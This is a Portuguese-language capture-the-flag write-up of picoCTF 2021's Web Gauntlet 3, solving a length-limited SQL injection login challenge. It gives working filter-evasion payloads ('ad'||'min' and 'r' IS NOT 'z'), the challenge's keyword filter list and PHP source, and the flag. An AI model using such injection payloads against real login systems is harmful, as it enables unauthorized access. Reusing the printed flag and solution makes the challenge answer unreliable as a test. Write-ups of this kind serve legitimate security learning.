# DuckWare Team - Web Gauntlet 3 (picoCTF 2021)
###### Solved by @xpics and @JoaoPedroPiceli  
>This CTF is about SQL Injection, Web exploitation  

# Desafio: Injeção SQL com Limite de Caracteres  

## Introdução  
Este desafio é uma variação do **Web Gauntlet 2**, explorando a mesma vulnerabilidade de **Injeção SQL**. A principal diferença é a **limitação de 25 caracteres** para o input de login e senha, exigindo um payload ainda mais curto.  

- **Página de Login:**[http://mercury.picoctf.net:29772/](http://mercury.picoctf.net:28715)  

[![imagem-2025-02-13-134723077.png](https://i.postimg.cc/5Nz0Fnrt/imagem-2025-02-13-134723077.png)](https://postimg.cc/w76HCcgK)
 
- **Página com Filtro:** [http://mercury.picoctf.net:29772/filter.php](http://mercury.picoctf.net:28715/filter.php)  
- **Filtro:** or and true false union like = > < ; -- /* */ admin  

## Descrição do Desafio  
O desafio mantém a vulnerabilidade de **Injeção SQL no login**, mas impõe um **limite de 25 caracteres** para impedir explorações mais extensas. Como os filtros são os mesmos do desafio anterior, a principal estratégia é otimizar o payload.  

## Estratégia de Solução  

### Manipulação do Campo de Usuário  
O nome de usuário `"admin"` está filtrado, então utilizamos a concatenação `||` para contornar essa restrição:  

- **Username:** `ad'||'min`  

### Manipulação do Campo de Senha  
O uso de **`OR`** está bloqueado, então precisamos de uma expressão curta que avalie como verdadeira sem ultrapassar o limite de caracteres:  

- **Password:** `r' IS NOT 'z`  

Com esses valores, conseguimos acessar a conta de administrador e receber a mensagem:  
*“Parabéns! Você ganhou! Confira filter.php”*  

[![imagem-2025-02-13-134928504.png](https://i.postimg.cc/fLkWWKXD/imagem-2025-02-13-134928504.png)](https://postimg.cc/WFLcX0XH)

## Recuperando a Bandeira  
Após realizar o login, basta recarregar `filter.php` para visualizar o código-fonte do desafio. A bandeira está nos comentários do código:  

```php
<?php
session_start();

if (!isset($_SESSION["winner3"])) {
    $_SESSION["winner3"] = 0;
}
$win = $_SESSION["winner3"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner3"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner3"] = 0;
}

// picoCTF{k3ep_1t_sh0rt_2a78ea34c84da0bf585ada4cb9a6f8fb}
?>
```

### Flag: **picoCTF{k3ep_1t_sh0rt_2a78ea34c84da0bf585ada4cb9a6f8fb}**


